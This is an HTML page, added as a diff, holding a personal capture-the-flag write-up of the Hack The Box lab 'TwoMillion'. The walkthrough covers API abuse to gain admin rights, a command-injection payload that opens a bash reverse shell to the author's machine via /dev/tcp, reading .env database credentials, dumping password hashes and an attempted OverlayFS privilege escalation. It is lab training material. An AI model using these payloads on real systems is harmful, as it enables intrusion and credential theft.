@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TwoMillion — Write-Up</title>
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+    <script src="../script.js" defer></script>
+</head>
+
+<body>
+
+<div id="mobile-menu-button">
+    &#9776;
+</div>
+
+<div id="sidebar" class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>TwoMillion</h1>
+
+        <p>Adventure Mode</p>
+
+        <p>As always, starting with a scan:</p>
+
+        <pre><code>┌──(glitch㉿Kali)-[~]
+└─$ sudo nmap -sC -sV -A -T4 -p- 10.129.22.180</code></pre>
+
+        <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+80/tcp open  http    nginx
+
+http-title: Did not follow redirect to http://2million.htb/</code></pre>
+
+        <p>I had to add 2million.htb in my /etc/hosts file in order to access it.</p>
+
+        <p>Then, nmap had to be run again.</p>
+
+        <pre><code>──(glitch㉿Kali)-[~]
+└─$ sudo nmap -sC -sV -A -T4 -p- 10.129.22.180</code></pre>
+
+        <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+80/tcp open  http    nginx
+
+http-title: Hack The Box :: Penetration Testing Labs</code></pre>
+
+        <p>This seems like a pretty big web app, so I will stick to guided mode for the sake of saving time.</p>
+
+        <p>Task 2</p>
+
+        <p>What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?</p>
+
+        <p>This can be found using F12, on the page source code.</p>
+
+        <pre><code>inviteapi.min.js</code></pre>
+
+        <p>Task 3</p>
+
+        <p>What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.</p>
+
+        <p>In order to see the full function, I took it from Debugger (inviteapi.min.js).</p>
+
+        <p>I tried to use JS beautifier, but it did not work.</p>
+
+        <p>However, ChatGPT did:</p>
+
+        <pre><code>function verifyInviteCode(code) {
+    var formData = {
+        code: code
+    };
+
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function(response) {
+            console.log(response);
+        },
+        error: function(response) {
+            console.log(response);
+        }
+    });
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function(response) {
+            console.log(response);
+        },
+        error: function(response) {
+            console.log(response);
+        }
+    });
+}</code></pre>
+
+        <p>Therefore, the function we are interested in is makeInviteCode.</p>
+
+        <p>Task 4</p>
+
+        <p>The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?</p>
+
+        <p>For this, I first ran:</p>
+
+        <pre><code>┌──(glitch㉿Kali)-[~]
+└─$ curl -X POST 10.129.22.180/api/v1/invite/how/to/generate
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+        <pre><code>┌──(glitch㉿Kali)-[~]
+└─$ curl -X POST 2million.htb/api/v1/invite/how/to/generate
+
+{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}</code></pre>
+
+        <p>Then, I used cipher identifier,
+        <a href="https://www.dcode.fr/cipher-identifier" target="_blank">https://www.dcode.fr/cipher-identifier</a>,
+        which identified it as ROT-13 and decoded as:</p>
+
+        <pre><code>In order to generate the invite code, make a POST request to /api/v1/invite/generate</code></pre>
+
+        <pre><code>┌──(glitch㉿Kali)-[~]
+└─$ curl -X POST 2million.htb/api/v1/invite/generate
+
+{"0":200,"success":1,"data":{"code":"S1o0UlotS1FERjQtWTY4Vk8tUkY3Sk8=","format":"encoded"}}</code></pre>
+
+        <p>Which cyberchef managed to decode as:</p>
+
+        <pre><code>From_Base64('A-Za-z0-9-_',true,false)
+KZ4RZ-KQDF4-Y68VO-RF7JO</code></pre>
+
+        <p>It does look like an invite code, so I think I am on the right track.</p>
+
+        <p>The answer was base64.</p>
+
+        <p>Task 5</p>
+
+        <p>What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?</p>
+
+        <p>Using the invite code I just found, I created an account.</p>
+
+        <p>Connection Pack can be found in Labs - Access.</p>
+
+        <p>When clicking on inspect element, the api can be identified as:</p>
+
+        <pre><code>/api/v1/user/vpn/generate</code></pre>
+
+        <p>Task 6</p>
+
+        <p>How many API endpoints are there under /api/v1/admin?</p>
+
+        <p>For this, I used Burp Suite in order to play with the requests.</p>
+
+        <p>Intercepted the request and sent it to Repeater.</p>
+
+        <p>I looked at all the endpoints of /api/v1:</p>
+
+        <pre><code>"admin": {
+    "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+    },
+    "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+    },
+    "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+    }
+}</code></pre>
+
+<p>So there are 3 endpoints.</p>
+
+<p>Task 7</p>
+
+<p>What API endpoint can change a user account to an admin account?</p>
+
+<p>As the instructions suggets, it would be the third one. But the format needs to be clean:</p>
+
+<pre><code>/api/v1/admin/settings/update</code></pre>
+
+<pre><code>PUT /api/v1/admin/settings/update HTTP/1.1
+
+Host: 2million.htb
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://2million.htb/login
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=88fprs37rpumjjnt6mis7c6nuk
+Connection: close
+Content-Type: application/json
+Content-Length: 55
+
+{
+    "email": "test@gmail.com",
+    "is_admin": 1
+}</code></pre>
+
+<p>Task 8</p>
+
+<p>What API endpoint has a command injection vulnerability in it?</p>
+
+<pre><code>/api/v1/admin/vpn/generate</code></pre>
+
+<p>since we can request with any username</p>
+
+<p>This means we can try a bash script</p>
+
+<pre><code>{
+    "username":
+"test$(bash -c 'bash -i >& /dev/tcp/10.10.15.30/8888 0>&1')"
+}</code></pre>
+
+<p>Which gets me the shell:</p>
+
+<pre><code>┌──(glitch㉿Kali)-[~]
+└─$ nc -lnvp 8888
+listening on [any] 8888 ...
+connect to [10.10.15.30] from (UNKNOWN) [10.129.22.180] 53916
+bash: cannot set terminal process group (1096): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$</code></pre>
+
+<p>Task 9</p>
+
+<p>What file is commonly used in PHP applications to store environment variable values?</p>
+
+<pre><code>.env</code></pre>
+
+<p>Submit User Flag</p>
+
+<p>Submit the flag located in the admin user's home directory.</p>
+
+<pre><code>www-data@2million:~/html$ cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123</code></pre>
+
+<p>These look like sql credentials.</p>
+
+<p>for this, i looked up a way to get a better shell:</p>
+
+<pre><code>┌──(glitch㉿Kali)-[~]
+└─$ nc -lnvp 8888
+listening on [any] 8888 ...
+connect to [10.10.15.30] from (UNKNOWN) [10.129.22.180] 50026
+bash: cannot set terminal process group (1096): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@2million:~/html$ ^Z
+zsh: suspended nc -lnvp 8888
+
+┌──(glitch㉿Kali)-[~]
+└─$ stty raw -echo;fg
+
+www-data@2million:~/html$ export TERM=xterm
+www-data@2million:~/html$ ls
+Database.php  VPN     controllers  fonts   index.php  views
+Router.php    assets  css          images  js</code></pre>
+
+<p>and now i can connect to mysql</p>
+
+<pre><code>www-data@2million:~/html$ mysql -u admin -p
+Enter password:
+Welcome to the MariaDB monitor.
+
+MariaDB [(none)]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| htb_prod           |
+| information_schema |
++--------------------+
+
+MariaDB [(none)]&gt; use htb_prod;
+
+MariaDB [htb_prod]&gt; show tables;
++--------------------+
+| Tables_in_htb_prod |
++--------------------+
+| invite_codes       |
+| users              |
++--------------------+
+
+MariaDB [htb_prod]&gt; select * from users;
++----+--------------+----------------------------+--------------------------------------------------------------+----------+
+| id | username     | email                      | password                                                     | is_admin |
++----+--------------+----------------------------+--------------------------------------------------------------+----------+
+| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
+| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
+| 13 | test         | test@gmail.com             | $2y$10$IpfB9sKUUXHXfvYWKnaSeuh3O.YvHDxUYHnaLrFcii70CbX.l8R5K |        1 |
++----+--------------+----------------------------+--------------------------------------------------------------+----------+</code></pre>
+
+<p>nothing really useful here, since those passwords are not easily crackable.</p>
+
+<p>However, it is much simpler:</p>
+
+<pre><code>www-data@2million:~/html$ cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+
+www-data@2million:~/html$ su - admin
+Password:
+
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+admin@2million:~$</code></pre>
+
+<p>which gets me the flag</p>
+
+<pre><code>admin@2million:~$ ls
+user.txt
+
+admin@2million:~$ cat user.txt</code></pre>
+
+<p>Task 11</p>
+
+<p>What is the email address of the sender of the email sent to admin?</p>
+
+<p>As the hint suggests, "Mail on Linux system is typically stored in one of a few locations."</p>
+
+<pre><code>admin@2million:/$ cd /var/mail
+admin@2million:/var/mail$ ls
+admin
+
+admin@2million:/var/mail$ cat admin
+
+From: ch4p &lt;ch4p@2million.htb&gt;
+To: admin &lt;admin@2million.htb&gt;
+Cc: g0blin &lt;g0blin@2million.htb&gt;
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: &lt;9876543210@2million.htb&gt;
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather</code></pre>
+
+<p>therefore, the email is: ch4p@2million.htb</p>
+
+<p>What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits</p>
+
+<p>exploit db did not provide any info, as the most recent CVE for overlayfs is from 2019.</p>
+
+<p>However, a google search does:</p>
+
+<pre><code>CVE-2023-0386</code></pre>
+
+<p>Submit the flag located in root's home directory.</p>
+
+<p>An article from
+<a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/" target="_blank">https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/</a>
+gave the exact solution.</p>
+
+<pre><code>admin@2million:/var/mail$ id
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+
+admin@2million:/var/mail$ unshare --user --map-user 0
+root@2million:/var/mail#</code></pre>
+
+<p>or not, since I can not get the flag</p>
+
+<pre><code>root@2million:/# whoami
+root
+
+root@2million:/# cd /root
+-bash: cd: /root: Permission denied</code></pre>
